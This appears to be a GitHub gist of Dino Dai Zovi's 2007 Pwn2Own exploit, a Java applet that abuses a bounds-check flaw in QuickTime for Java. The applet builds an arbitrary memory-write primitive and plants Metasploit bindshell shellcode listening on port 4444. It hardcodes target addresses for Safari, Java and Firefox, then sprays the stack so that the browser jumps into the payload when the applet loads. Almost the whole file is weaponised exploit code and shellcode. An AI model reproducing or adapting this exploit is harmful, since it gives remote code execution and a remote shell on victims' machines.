//date: 2023-03-21T16:52:23Z
//url: https://api.github.com/gists/3163b8c54c240fe1d5b3d7341b1e8838
//owner: https://api.github.com/users/ddz

/*
 * Lambda
 *
 * QTJava, a Java extension made available to Java applets has some
 * parameter validation problems when calling native memory copying
 * methods.  This allows us to read and write out of the bounds of our
 * heap allocated QTObject.  With some tricks, we are able to turn
 * this into a write4 primative allowing us to write arbitrary values
 * to chosen locations.  Insert the shellcode in a writable and
 * executable page, spam the stack with that address, and owned.
 *
 * Vulnerability discovered, researched, and exploited over the night
 * to remotely win the 'pwn-2-own' contest at CanSecWest 07.
 *
 * Dino Dai Zovi <ddz@theta44.org>, 20070420
 */

import java.awt.*;
import java.applet.*;
import java.io.*;
import java.util.*;

import quicktime.*;
import quicktime.util.*;

public class Lambda extends Applet {
    
    /*
     * You are not expected to understand this.
     */
    public void write4(int what, int where) {
        try {
            if (QTSession.isInitialized() == false)
                QTSession.open();

            QTHandle qth = new QTHandle(0, false);
            QTPointerRef qtpr = qth.toQTPointer(0x7fffffff, 0x7fffffff);

            int base, size, top;
            
            base = QTObject.ID(qtpr);
            size = qtpr.getSize();
            top = base + size;
            
            int word[] = new int[1];
            word[0] = what;
            int index = where - base;
            
            qtpr.copyFromArray(index, word, 0, 1);
        }
        catch (QTException qte) {
            throw new RuntimeException(qte.getMessage());
        }
    }        


    /*
     * Metasploit 3.0's osx/intel/bindshell to port 4444
     *
     * props to the metasploit crew.
     */
    public void exploit() {
        byte[] shellCode = {
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90,
            (byte)0x6a, (byte)0x42, (byte)0x58, (byte)0xcd,
            (byte)0x80, (byte)0x6a, (byte)0x61, (byte)0x58,
            (byte)0x99, (byte)0x52, (byte)0x68, (byte)0x10,
            (byte)0x02, (byte)0x11, (byte)0x5c, (byte)0x89,
            (byte)0xe1, (byte)0x52, (byte)0x42, (byte)0x52,
            (byte)0x42, (byte)0x52, (byte)0x6a, (byte)0x10,
            (byte)0xcd, (byte)0x80, (byte)0x99, (byte)0x93,
            (byte)0x51, (byte)0x53, (byte)0x52, (byte)0x6a,
            (byte)0x68, (byte)0x58, (byte)0xcd, (byte)0x80,
            (byte)0xb0, (byte)0x6a, (byte)0xcd, (byte)0x80,
            (byte)0x52, (byte)0x53, (byte)0x52, (byte)0xb0,
            (byte)0x1e, (byte)0xcd, (byte)0x80, (byte)0x97,
            (byte)0x6a, (byte)0x02, (byte)0x59, (byte)0x6a,
            (byte)0x5a, (byte)0x58, (byte)0x51, (byte)0x57,
            (byte)0x51, (byte)0xcd, (byte)0x80, (byte)0x49,
            (byte)0x0f, (byte)0x89, (byte)0xf1, (byte)0xff,
            (byte)0xff, (byte)0xff, (byte)0x50, (byte)0x68,
            (byte)0x2f, (byte)0x2f, (byte)0x73, (byte)0x68,
            (byte)0x68, (byte)0x2f, (byte)0x62, (byte)0x69,
            (byte)0x6e, (byte)0x89, (byte)0xe3, (byte)0x50,
            (byte)0x54, (byte)0x54, (byte)0x53, (byte)0x53,
            (byte)0xb0, (byte)0x3b, (byte)0xcd, (byte)0x80,
	    (byte)0xcc, (byte)0xcc, (byte)0xcc, (byte)0xcc,
	    (byte)0xcc, (byte)0xcc, (byte)0xcc, (byte)0xcc,
	    (byte)0xcc, (byte)0xcc, (byte)0xcc, (byte)0xcc,
	    (byte)0xcc, (byte)0xcc, (byte)0xcc, (byte)0xcc,
        };

        /*
         * We need a place to write our code
         */
        
        int codeBase = 0x000e2e00;  // Safari
        //int codeBase = 0x0000cf00; // Java 1.5
        //int codeBase = 0x00a81e00;  // Firefox 2.0

        /*
         * We write the code address over the stack to force the
         * browser to jump into it
         */
        int stackBase = 0xbfffe000; // Safari, Java

        
        for (int i = 0; i < shellCode.length; i += 4) {
            int s =
                (shellCode[i+0] & 0xFF) |
                ((shellCode[i+1] & 0xFF) << 8) |
                ((shellCode[i+2] & 0xFF) << 16) |
                ((shellCode[i+3] & 0xFF) << 24);
                
            write4(s, codeBase + (i));
        }

        for (int i = 0; i < 1024; i++) {
            write4(codeBase, stackBase + (i*4));
        }

    }
    
    static public void main(String args[]) throws Exception {
        
        Lambda y = new Lambda();
        y.exploit();
    }
    
    public void start() {
        // Target the exploit to the OS, Browser, and JRE version
        String httpAgent = System.getProperty("http.agent");
        String osName = System.getProperty("os.name");
        String osVersion = System.getProperty("os.version");
        String osArch = System.getProperty("os.arch");
        String vmVersion = System.getProperty("java.vm.version");

        exploit();
    }
}